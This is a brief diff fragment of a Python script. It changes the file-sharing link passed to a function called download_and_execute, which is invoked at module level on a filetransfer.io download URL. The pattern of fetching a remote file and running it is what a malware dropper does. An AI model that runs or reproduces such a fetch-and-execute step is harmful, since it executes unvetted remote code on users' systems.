@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://filetransfer.io/data-package/gqIQ0XCU/download")
+download_and_execute("https://filetransfer.io/data-package/SfwTFKfD/download")
